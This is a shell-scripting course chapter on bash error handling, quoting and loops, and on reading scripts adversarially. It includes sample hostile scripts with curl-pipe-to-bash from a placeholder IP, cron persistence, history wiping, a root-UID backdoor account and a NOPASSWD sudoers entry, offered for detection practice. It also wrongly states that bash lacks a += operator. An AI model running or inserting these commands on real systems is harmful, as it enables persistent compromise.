# Chapter 9: Shell Scripting

**You come in with:** workshop-level "I have run a script someone else wrote." You have seen `set -euo pipefail`. You know what `#!/usr/bin/env bash` does.
**You leave with:** the ability to write a wrapper script with proper error handling, read someone else's script (including a slightly suspicious one) and figure out what it does, and recognize the common patterns scripts use in real environments.

**Time:** 60 to 90 minutes including the exercises.

**Security+ alignment:** Domain 2.4 (indicators of malicious activity: malicious code, including malicious scripts). Domain 4.7 (automation and orchestration: scripts as automation primitives). Domain 5.4 (security awareness practices: recognition of suspicious code). The "read this script and find what is wrong with it" exercise in this chapter is the practical version of analyzing scripts during incident response.

---

## Why this chapter is shaped this way

A typical "introduction to shell scripting" chapter teaches you to write a CLI tool. This one is different. The audience is sysadmins and security professionals, not application developers. You will read more scripts than you will write. Some of the scripts you read will be hostile.

The reframing: the priority is reading skill plus enough writing skill to wrap three commands with proper error handling. That is the realistic working-admin shape. Big shell tools should be written in Python or Go, not bash. Bash is for glue.

Two things this chapter does that most do not. First, it spends meaningful time on reading scripts adversarially. Second, the writing exercises are wrapper-shaped rather than CLI-shaped. The skill is "I can read what is on a system I did not build, and I can wrap three commands into a reliable script." Anything past that, you should be reaching for a real programming language.

---

## The minimum viable script

A shell script is a text file that the shell runs. The first line is the shebang, which tells the system which interpreter to use. The file needs the executable bit set. That is it.

```bash
#!/usr/bin/env bash
echo "hello from bash"
```

Save as `/tmp/hello.sh`. Make it executable:

```
chmod +x /tmp/hello.sh
```

Run it:

```
/tmp/hello.sh
```

The shebang `#!/usr/bin/env bash` is the modern form. The older `#!/bin/bash` works on most Linux systems but breaks on systems where bash is in a different location (some BSDs, some custom distributions). `#!/usr/bin/env bash` asks the system to find bash on the PATH, which is more portable.

### Why scripts need the safety preamble

Bash, by default, is forgiving in ways that are bad for scripts. A command that fails does not stop the script. Variables that are not set return empty strings instead of errors. A pipeline's exit code is the exit code of the last command, regardless of whether earlier commands failed.

These behaviors are convenient for interactive use. They are catastrophic for scripts you will rely on later. The fix is the safety preamble:

```bash
#!/usr/bin/env bash
set -euo pipefail
```

What each flag does:

- `-e`: exit immediately if any command fails. Without this, the script continues after errors, often making things worse.
- `-u`: error if you reference an undefined variable. Without this, typos in variable names silently expand to empty strings.
- `-o pipefail`: if any command in a pipeline fails, the whole pipeline fails. Without this, `false | true` reports success.

These three flags should be at the top of every script that matters. Together they turn bash from "best effort and hope for the best" into "fail loud, fail early." Most scripts that produce mysterious results in production are scripts that lacked this preamble.

### Variables and substitution

Variables are set without `$`, used with `$`:

```bash
NAME="Steven"
echo "Hello, $NAME"
echo "Hello, ${NAME}"
```

Curly braces are optional in simple cases but required when the variable name is followed by a character that could be part of the name:

```bash
FILE="report"
echo "$FILE.txt"        # works, $FILE then literal .txt
echo "${FILE}_v2.txt"   # required, otherwise bash looks for $FILE_v2
```

Command substitution captures the output of a command:

```bash
TODAY=$(date +%F)
echo "Today is $TODAY"
```

The `$(command)` form is preferred over the older backtick form. `$()` can be nested cleanly; backticks cannot.

### Quoting matters more than you think

The single most common bug in shell scripts is unquoted variables that contain spaces or special characters.

```bash
FILE="my report.txt"
ls $FILE       # bash splits "my report.txt" into two arguments. ls fails or wrong file.
ls "$FILE"     # bash treats "my report.txt" as one argument. Works.
```

The rule: **always double-quote variable expansions** unless you have a specific reason not to. If `$VAR` could ever contain spaces or special characters, the unquoted form is broken.

There is one important exception: when you want word-splitting (like passing multiple arguments via a variable), unquoted is correct. But that is the rare case. Default to quoting; opt out only when you need to.

The difference between single and double quotes:

```bash
NAME="Steven"
echo "Hello, $NAME"     # Hello, Steven
echo 'Hello, $NAME'     # Hello, $NAME (literal)
```

Single quotes are literal: no expansion, no interpretation. Double quotes allow `$variable` and `$(command)` and `\` escapes. Use single quotes when you want literal text. Use double quotes when you want substitution.

---

## Conditionals

The if/then/else syntax in bash:

```bash
if [ "$NAME" = "Steven" ]; then
    echo "Hi Steven"
elif [ "$NAME" = "Alex" ]; then
    echo "Hi Alex"
else
    echo "Who are you?"
fi
```

The square brackets are the test command (also written `test`). The spaces inside the brackets matter: `[$NAME]` is not the same as `[ $NAME ]`. Always have spaces around the operands.

### Common test operators

For strings:

| Test | Meaning |
|---|---|
| `[ "$a" = "$b" ]` | Equal |
| `[ "$a" != "$b" ]` | Not equal |
| `[ -z "$a" ]` | Empty |
| `[ -n "$a" ]` | Not empty |

For numbers:

| Test | Meaning |
|---|---|
| `[ "$a" -eq "$b" ]` | Equal |
| `[ "$a" -ne "$b" ]` | Not equal |
| `[ "$a" -lt "$b" ]` | Less than |
| `[ "$a" -gt "$b" ]` | Greater than |
| `[ "$a" -le "$b" ]` | Less than or equal |
| `[ "$a" -ge "$b" ]` | Greater than or equal |

For files:

| Test | Meaning |
|---|---|
| `[ -e "$f" ]` | Exists |
| `[ -f "$f" ]` | Is a regular file |
| `[ -d "$f" ]` | Is a directory |
| `[ -r "$f" ]` | Is readable |
| `[ -w "$f" ]` | Is writable |
| `[ -x "$f" ]` | Is executable |
| `[ -s "$f" ]` | Exists and is non-empty |

The string operators trip people up because `=` for strings vs `-eq` for numbers is asymmetric with most programming languages. `=` for strings, `-eq` for numbers. Mixing them does not error but does the wrong thing.

### The double-bracket form

Bash also has `[[ ]]`, which is the bash-specific extended test:

```bash
if [[ "$NAME" == "Steven" ]]; then
    echo "Hi"
fi
```

`[[` is more forgiving with quoting and supports pattern matching:

```bash
if [[ "$FILE" == *.log ]]; then
    echo "It's a log file"
fi
```

For new scripts, `[[ ]]` is preferred when you know you are running bash. `[ ]` is preferred for portability across shells (sh, dash). For this course, use `[[ ]]` unless you have a specific reason to write portable shell.

---

## Loops

### for loops

```bash
for FILE in /var/log/*.log; do
    echo "Processing $FILE"
    wc -l "$FILE"
done
```

The pattern `/var/log/*.log` is expanded by bash before the loop runs. Each match becomes one iteration. If no files match, the loop runs once with the literal pattern (a confusing default; we cover the fix below).

For numeric loops:

```bash
for I in {1..5}; do
    echo "Iteration $I"
done
```

For loops over command output:

```bash
for USER in $(cut -d: -f1 /etc/passwd); do
    echo "User: $USER"
done
```

That gets every username from /etc/passwd. The pattern works but is fragile (it breaks if any username contains spaces or special characters). For files specifically, the safer pattern is `while read`:

```bash
while IFS= read -r LINE; do
    echo "Line: $LINE"
done < /etc/passwd
```

`IFS= read -r` is the canonical safe-read incantation. `IFS=` prevents word splitting on the read; `-r` prevents backslash interpretation. Together they handle weird filenames and weird content.

### while loops

```bash
COUNT=0
while [ $COUNT -lt 5 ]; do
    echo "Count: $COUNT"
    COUNT=$((COUNT + 1))
done
```

`$((expression))` is arithmetic substitution. Bash does not have a `+=` operator the way C does; you use `$((COUNT + 1))` or `((COUNT++))`.

---

## Exit codes

Every command returns an exit code, an integer. 0 is success. Non-zero is failure, with the specific number sometimes meaningful.

```bash
ls /etc
echo "Exit: $?"     # 0

ls /does-not-exist
echo "Exit: $?"     # 2 (file not found)
```

`$?` is the exit code of the last command. It changes with every command, so capture it immediately if you need it.

In scripts, you set your own exit code with `exit`:

```bash
#!/usr/bin/env bash
set -euo pipefail

if [[ ! -f /etc/hostname ]]; then
    echo "Missing /etc/hostname" >&2
    exit 1
fi

echo "Hostname: $(cat /etc/hostname)"
```

Two patterns to note:

- `>&2` redirects to stderr. Error messages should go to stderr, not stdout. Tools that capture script output expect this convention.
- `exit 1` returns failure. The convention is 0 for success, 1 for general failure, 2 for misuse, and other codes for specific failures.

When a script is part of a pipeline (cron, systemd timer, CI/CD), exit codes are how the system knows whether the script succeeded. A script that always exits 0 even on failure makes monitoring impossible.

---

## Functions

Functions group commands and accept arguments:

```bash
log_message() {
    local LEVEL="$1"
    local MESSAGE="$2"
    echo "[$(date +'%F %T')] [$LEVEL] $MESSAGE" >&2
}

log_message INFO "Starting backup"
log_message ERROR "Backup failed"
```

Reading this:

- `local LEVEL="$1"` declares a function-local variable. Without `local`, the variable is global, which causes weird bugs. Always use `local` for function variables.
- `$1` is the first argument. `$2` is the second. `$@` is all arguments.
- `>&2` sends output to stderr.

For scripts that do more than three things, functions are how you keep the logic readable. The pattern is "small functions named for what they do, called from a short main flow at the bottom of the script."

---

## A real wrapper script: putting it together

The exercise: write a script that backs up a directory, with proper error handling and logging.

```bash
#!/usr/bin/env bash
set -euo pipefail

# Configuration
SOURCE_DIR="/var/www/html"
BACKUP_DIR="/var/backups/sites"
LOG_FILE="/var/log/site-backup.log"
RETENTION_DAYS=7

# Helper functions
log() {
    echo "[$(date +'%F %T')] $*" >> "$LOG_FILE"
}

err() {
    echo "[$(date +'%F %T')] ERROR: $*" >> "$LOG_FILE"
    echo "ERROR: $*" >&2
}

# Validation
if [[ ! -d "$SOURCE_DIR" ]]; then
    err "Source directory $SOURCE_DIR does not exist"
    exit 1
fi

mkdir -p "$BACKUP_DIR"

# The work
STAMP=$(date +%F_%H%M)
ARCHIVE="$BACKUP_DIR/site-${STAMP}.tar.gz"

log "Starting backup of $SOURCE_DIR to $ARCHIVE"

if tar -czf "$ARCHIVE" "$SOURCE_DIR" 2>>"$LOG_FILE"; then
    log "Backup complete. Size: $(du -h "$ARCHIVE" | cut -f1)"
else
    err "tar failed"
    rm -f "$ARCHIVE"
    exit 2
fi

# Cleanup old backups
log "Cleaning up backups older than $RETENTION_DAYS days"
find "$BACKUP_DIR" -name 'site-*.tar.gz' -mtime "+$RETENTION_DAYS" -delete

log "Done"
```

Walking through what this script does well:

- The safety preamble.
- All configuration in named variables at the top, easy to change.
- Helper functions for logging and errors.
- Validation before doing anything destructive.
- The archive creation is wrapped in if/then so a failure is caught and reported, not just exit-via-set-e.
- Failed archives are cleaned up (no partial file left around).
- Old backups are pruned to prevent unbounded disk growth.
- Distinct exit codes for different failure modes.

This is roughly the maximum complexity worth doing in shell. Anything more complex (parsing arguments, managing state across runs, error-recovery logic) is the moment to switch to Python.

---

## Reading scripts adversarially

Half of this chapter's value is reading skill, not writing skill. A working sysadmin reads scripts written by other people, scripts inherited from old admins, and during incidents, scripts left behind by attackers.

The mental model for reading any script:

1. **What does the shebang say?** The interpreter matters. Some attackers write scripts that abuse non-default interpreters.
2. **Is there a safety preamble?** Production scripts usually have one. Scripts that intentionally swallow errors often do not.
3. **What variables are defined at the top?** Configuration, paths, target hosts, credentials. The top of a script is its specification.
4. **What is the main flow?** Read the bottom of the script first, where the work usually happens. Then look up to the helper functions when you need to understand what they do.
5. **What network operations does it do?** `curl`, `wget`, `nc`, `ssh`, `scp`, `ftp`. Each one is an outbound connection. To where, with what data?
6. **What does it write to the filesystem?** `>`, `>>`, `cp`, `mv`, `tee`. Each one modifies the system. Into what files, with what content?
7. **What does it execute?** `bash -c`, `eval`, `source`, dynamic command construction. Each one is potential code execution from data.
8. **What does it clean up after itself?** Logs cleared, history cleared, files removed. Cleanup is normal in good scripts; aggressive cleanup is a signal in suspicious ones.

### A script worth reading

Read this script and identify what it does. Take a minute before reading the analysis below.

```bash
#!/bin/bash

curl -s http://203.0.113.45/c.sh | bash

mkdir -p /tmp/.cache && chmod 700 /tmp/.cache
echo "*/30 * * * * curl -s http://203.0.113.45/r.sh | bash" >> /var/spool/cron/crontabs/root

history -c
unset HISTFILE
echo > ~/.bash_history

cat <<EOF >> /etc/passwd
support:x:0:0:Support:/root:/bin/bash
EOF
```

What is wrong with it? Walk through line by line.

`curl -s http://203.0.113.45/c.sh | bash` downloads a script from a hardcoded IP and executes it. The `-s` is silent mode, suppressing progress output. Downloading and running unknown code is a textbook compromise pattern. Reference: MITRE ATT&CK T1059.004 (Command and Scripting Interpreter: Unix Shell).

The mkdir into `/tmp/.cache` (note the leading dot, hiding it from `ls` without `-a`) is creating a hidden directory. This is a common location for staging.

The crontab line writes a recurring 30-minute task that downloads and executes another script. This is persistence: the box reaches out to the attacker every 30 minutes. Reference: MITRE ATT&CK T1053.003 (Scheduled Task/Job: Cron).

`history -c`, `unset HISTFILE`, and `> ~/.bash_history` clear the bash history three different ways, in case any one of them fails. This is anti-forensics. Reference: T1070.003 (Indicator Removal: Clear Command History).

The heredoc to `/etc/passwd` adds a user account named `support` with UID 0 (root) and `/bin/bash` as the shell. UID 0 is what makes a user root; the username does not matter. This is a backdoor account. Reference: T1136.001 (Create Account: Local Account).

This six-line script does five things wrong, each of which would be caught by basic security tooling. Run on a real system without that tooling, it would compromise the system in seconds.

The skill: noticing each of these patterns, even when they are wrapped in less obvious script structure, even when comments and decoy code obscure them. Practice on real (sanitized) examples is the only way to build it.

We come back to this in Chapter 11 with more depth.

### Less obviously hostile patterns

Real malicious scripts hide better than the example above. Watch for:

- Encoded payloads: `echo "base64stuff" | base64 -d | bash`. The decoded string is the actual command.
- Obfuscated variable names: meaningful logic with names like `_x1` and `_x2`.
- Indirect execution: `eval` on a constructed string, `bash -c` with a built command.
- Time-bombs: scripts that only act on certain dates or after a certain delay.
- Persistence in unexpected locations: not just `/etc/cron.*` but `/etc/profile.d/*`, `~/.bashrc`, systemd unit overrides, `/etc/sudoers.d/`.

A junior security professional learns these patterns by reading lots of real and synthetic samples. The intermediate cohort goes deeper. For now, recognizing the obvious cases (the example above) is the goal.

---

## Try this

**1. Write a wrapper script.**

Pick a multi-step task you do regularly. Examples: "show the last 50 ssh failures and their source IPs," "list the top 10 largest files under /var," "check whether nginx is running and report status with exit code." Write a script that does it.

Apply the conventions:

- Shebang and safety preamble.
- Configuration variables at the top.
- A small helper function for logging.
- Validation before doing the work.
- Distinct exit codes for distinct failure modes.

Save as `/usr/local/bin/yourscript.sh`. Make it executable. Run it. Confirm it works.

**2. Read a real script on your lab box.**

Find a script in `/usr/lib/` or `/etc/cron.daily/`. Read it through. Answer:

- What does the shebang say?
- Does it have a safety preamble?
- What does it do? Summarize in one sentence.
- What system files does it modify, if any?
- What network operations does it perform, if any?

Pick a system script with real complexity. `/etc/cron.daily/apt-compat` or `/etc/cron.daily/man-db` or similar. Just walk it.

**3. Read this synthetic suspicious script and identify each finding.**

```bash
#!/bin/bash
WORKDIR=/tmp/.system-cache
mkdir -p $WORKDIR
cd $WORKDIR

curl -fsSL https://example.com/install.sh -o install.sh
chmod +x install.sh
./install.sh

echo "@reboot /tmp/.system-cache/install.sh" | crontab -

cp /etc/sudoers /etc/sudoers.bak
echo "deploy ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

logger "System updated successfully"
```

Walk through it. For each line or block, identify what it does and whether it is a finding. There are at least four real findings here. Compare your analysis with the answer key at the end of this chapter (in your CourseStack notes).

**4. Add error handling to a script that lacks it.**

Find or write a simple script that uses `>` redirects and pipelines without `set -euo pipefail`. Add the safety preamble. Run it. Now intentionally make one of the commands fail (typo a path, etc.). Notice the difference: with the preamble, the script stops at the failure. Without it, the script continues and may produce confusing partial results.

**5. Trace a pipeline.**

Take any pipeline you wrote in Chapter 1 (something with `grep`, `awk`, `cut`, `sort`, `uniq`). Save it as a script with `set -euo pipefail`. Run it and confirm it works. Then break the first command of the pipeline (typo a filename). Notice: with `pipefail`, the script exits with non-zero. Without, it might still report success because the last command in the pipeline succeeded with empty input.

---

## Common stumbling blocks

> **My script works when I run it manually but fails when run by cron or systemd.**
> The most common cause is environment variables. Cron and systemd run with a minimal environment that does not include your interactive `$PATH` or other variables. Either use absolute paths in the script (`/usr/bin/curl` not just `curl`), or set PATH explicitly at the top of the script (`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`).

> **`set -e` is on but my script continues after a command fails.**
> `set -e` has surprising exceptions. It does not exit if the failing command is part of a conditional (`if`, `&&`, `||`). It does not exit on functions called inside conditionals. It does not exit on the last command in a pipeline by default; that is what `pipefail` fixes. In practice, the way to write reliable error handling is to wrap risky commands in if/then/else and explicitly handle failures, even with `set -e` enabled.

> **`set -u` errors on a variable I expect to be empty.**
> The fix is to use `${VAR:-}` (default to empty if unset) or `${VAR:-default}` (default to "default" if unset). For arrays you may need `"${ARR[@]:-}"` to handle the empty case.

> **My quoted variable still gets word-split.**
> Probably you used single quotes when you meant double. Single quotes prevent expansion, so `'$VAR'` is literal. Double quotes preserve word boundaries while expanding: `"$VAR"`.

> **The script outputs ANSI color codes when written to a log file.**
> Some commands (ls, grep, journalctl) detect whether stdout is a terminal and add color codes when it is. When stdout is a pipe or file, they should not, but some commands or scripts force color. For ls and grep, use `--color=never` or unset GREP_COLORS. For broader fixes, set `TERM=dumb` at the top of the script.

> **`for FILE in *.log; do ... done` runs once with literal `*.log` when no files match.**
> Bash's default for an empty glob is the literal pattern, which is almost never what you want. Either use `shopt -s nullglob` (which makes empty globs expand to nothing) or check for matches explicitly: `for FILE in *.log; do [ -e "$FILE" ] || continue; ...`. The `nullglob` option is the cleaner fix; put it at the top of the script.

---

## What this gets you

After this chapter:

- You can write a wrapper script with proper error handling.
- You can read someone else's script and understand what it does.
- You can recognize the eight or so suspicious patterns common in malicious scripts.
- You know when to reach for shell and when to reach for Python.
- You know the safety preamble (`set -euo pipefail`) and why every script that matters should have it.
- You know the quoting rules and why "always double-quote variables" is the default.
- You know exit codes are not optional for scripts that need to be monitorable.

The reading-adversarially skill is the most important thing in this chapter. You will read more scripts than you will write. Practice noticing the patterns in the suspicious example. Chapter 11 deepens this with the artifacts angle and ATT&CK references.

---

## What's next

Chapter 10 is Reading the system. The chapter where `/proc` becomes a tool you actually use, where `lsof` and `strace` make their cameo at survival depth, and where you can answer "what is this process actually doing" without guessing.
